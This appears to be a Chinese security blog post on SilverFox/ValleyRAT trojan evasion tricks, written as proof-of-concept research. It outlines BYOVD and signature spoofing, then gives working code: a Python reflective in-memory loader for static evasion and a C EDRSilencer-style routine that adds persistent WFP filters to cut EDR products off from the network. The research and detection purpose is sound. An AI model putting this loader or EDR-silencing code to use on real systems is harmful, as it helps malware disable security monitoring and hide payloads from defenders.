---
title: 2025上半年银狐木马对抗手法POC
date: 2025-12-15 18:00:00 -0500
categories: [Research]
tags: [malware, trojan, silver-fox, winos, apt, malware-analysis, poc]
description: 列举了一些银狐木马常用对抗杀软/EDR手段以及代码实现.
media_subpath: /assets/img/2025-12-15-silver-fox-poc-2025
---

银狐（SilverFox）木马（又称 ValleyRAT 或 Winos 变种）是针对中国国内政企、财务及医疗系统威胁最高的远控工具之一，其 EDR/杀软对抗技术已演进至内核阶段。

该木马部分变种以 **“双驱并行 + 签名欺骗”** 为核心逻辑，展现出极高的对抗强度：

*   **静态层面**：不仅利用“白加黑”技术劫持合法签名程序，更通过修改已签名驱动的非校验字节（如时间戳）来改变文件哈希。这种手法既能绕过哈希黑名单，又能维持微软数字签名的有效性。
*   **动态对抗**：2025 年的变种大规模采用了 **BYOVD (Bring Your Own Vulnerable Driver)** 战术。通过强制加载存在已知或“未知”漏洞的合法驱动（如 WatchDog、Zemana 或国产反作弊驱动），在 Ring 0 层暴力结束 EDR 进程或摘除内核监控钩子 (Hook)。
*   **隐蔽通信**：核心载荷常通过 LSB 图片隐写或加密内存加载实现“无文件”运行，并结合云存储 (OSS) 流量隧道，使其在端点与网络侧均具备极高的隐蔽性。

本文整理了银狐木马常用的对抗 AV/EDR 手段的代码实现。这些内容基于我对多篇分析报告的研读以及开源社区项目的搜集。为了验证这些技术，我制作了一系列测试样本并发布于卡饭安全论坛。

在本篇博客中，我将分享相关的代码片段、开源 Codebase，并演示如何使用 Python 将其整合为 Demo 测试样本。

## 反射式 DLL 注入 (RDI)

虽然大部分对抗技术的原始代码是 C/C++ 编写的，但为了简化集成流程并提高 Demo 开发效率，我选择 **Python** 作为主要语言，并利用 **RDI (Reflective DLL Injection)** 技术来实现静态免杀。

### 静态免杀思路

实现静态免杀的最佳方法之一是让 Payload 或关键 Binary 在内存中解密执行，避免落地。常见的实现路径有：
1.  从网络直接下载至内存 Buffer 并执行。
2.  读取加密的磁盘 Payload，在内存中解密后执行。

### 宿主进程选择

通常情况下，我们需要挑选一个合适的宿主进程。一个完美的宿主进程应具备以下特征：
1.  **拥有有效签名**：系统中最受信任的可执行文件。
2.  **高频使用**：经常出现在用户电脑中，不会引起怀疑。
3.  **行为特征**：日常参与大量文件或网络 I/O 操作。
4.  **执行能力**：最好是解释器或具有执行任意代码的能力。

基于以上标准，Python 的脚本解释器 `python.exe` 是一个完美的选项。银狐木马也采用了类似的 RDI 操作，利用白名单进程进行掩护。

### 代码实现

Python 社区已经提供了现成的库：[PythonMemoryModule](https://github.com/naksyn/PythonMemoryModule)。

导入此库后，即可将任意 DLL/EXE 加载进 `python.exe` 宿主进程的内存中。经过本地测试，C/C++ 编译的 EXE 可以完美运行，但 .NET 程序无法正常工作。

```python
import pythonmemorymodule

# data 为读取到的二进制数据（如加密 payload 解密后的 bytes）
pythonmemorymodule.MemoryModule(data=data)
```

## 利用 WFP 断网杀软/EDR

**Windows Filtering Platform (WFP)** 是 Windows Vista 及更高版本引入的一套网络流量过滤架构。它为防火墙、入侵检测系统（IDS）、杀毒软件等安全产品提供了统一的底层 API，用于检查和修改网络数据包。

虽然许多安全产品通过 WFP Callout 驱动来实现网络监控，但恶意软件同样可以利用这一机制，注册恶意的 WFP 过滤器来隐藏自身流量或阻断安全软件的通信。

### 传统方法 vs. WFP

在传统攻防场景中，操控网络流量通常需要内核级访问权限（例如使用 NDIS 驱动或 TDI 过滤）。这种方式门槛较高，攻击者必须面对以下挑战：

*   编写并获取合法的内核驱动签名。
*   绕过驱动签名强制执行（Driver Signature Enforcement）。
*   对抗 PatchGuard (KPP) 等内核保护机制。

相比之下，WFP 的用户态引擎 —— **基础过滤引擎 (BFE, Base Filtering Engine)** —— 允许任何拥有管理员权限的进程通过用户态 API 添加过滤器，而**无需编写或加载内核驱动**。攻击者只需调用 `fwpuclnt.dll` 中的几个函数，即可实现对网络层的控制。

### EDRSilencer 与银狐的实现

开源项目 [EDRSilencer](https://github.com/netero1010/EDRSilencer) 正是基于这一原理诞生的。该工具于 2023 年末发布，旨在针对 EDR/AV 进程设置 WFP 过滤器，从而屏蔽其与云端的通信，使其无法上报威胁信息。银狐木马在 2025 年的变种中也采用了完全相同的手段。

为了规避检测，EDRSilencer 的作者自己实现了 `FwpmGetAppIdFromFileName0` 函数，避免了直接调用 `CreateFileW`，从而成功绕过了 Minifilter 的监控。

以下是基于 EDRSilencer 核心逻辑的代码片段，展示了如何配置 WFP 过滤器以阻断特定进程的流量：

```c
// 设置过滤器显示名称（用于 netsh wfp show filters 等管理命令）
filter.displayData.name = filterName;

// PERSISTENT: 持久化过滤器，存储在注册表中，系统重启后依然生效直到显式删除
filter.flags = FWPM_FILTER_FLAG_PERSISTENT;

// ALE_AUTH_CONNECT_V4: 出站连接授权层，TCP connect() / UDP首包 / ICMP首包时触发，有状态，每连接仅评估一次
filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;

// BLOCK: 阻断匹配的网络流量
filter.action.type = FWP_ACTION_BLOCK;

// 权重 = 优先级，UINT64_MAX 确保此过滤器先于 EDR 自身的 PERMIT 规则被评估
UINT64 weightValue = 0xFFFFFFFFFFFFFFFF;
filter.weight.type = FWP_UINT64;
filter.weight.uint64 = &weightValue;

// ALE_APP_ID: 按应用程序路径匹配（NT 设备路径格式，如 \device\harddiskvolume1\...\xxx.exe）
cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;
// 精确匹配
cond.matchType = FWP_MATCH_EQUAL;
// appId 是 FWP_BYTE_BLOB 结构，由 FwpmGetAppIdFromFileName0() 或自定义实现获取
cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;
cond.conditionValue.byteBlob = appId;

// 关联条件到过滤器，多条件为 AND 关系
filter.filterCondition = &cond;
filter.numFilterConditions = 1;

// Provider: 过滤器的逻辑分组/所有者标识，便于管理和批量删除
if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
    filter.providerKey = &providerGuid;  // 复用已存在的 Provider
} else {
    provider.displayData.name = providerName;
    provider.displayData.description = providerDescription;
    provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;  // Provider 也持久化
    result = FwpmProviderAdd0(hEngine, &provider, NULL);
    if (result != ERROR_SUCCESS) {
        printf("[-] FwpmProviderAdd0 failed with error code: 0x%x.\n", result);
    } else {
        if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
            filter.providerKey = &providerGuid;
        }
    }
}

// 添加 IPv4 出站阻断过滤器，filterId 用于后续 FwpmFilterDeleteById0 删除
result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
if (result == ERROR_SUCCESS) {
    printf("Added WFP filter for \"%s\" (Filter id: %d, IPv4 layer).\n", fullPath, filterId);
} else {
    printf("[-] Failed to add filter in IPv4 layer with error code: 0x%x.\n", result);
}

// 同时阻断 IPv6，防止 EDR 通过 IPv6 通信
filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
if (result == ERROR_SUCCESS) {
    printf("Added WFP filter for \"%s\" (Filter id: %d, IPv6 layer).\n", fullPath, filterId);
} else {
    printf("[-] Failed to add filter in IPv6 layer with error code: 0x%x.\n", result);
}
```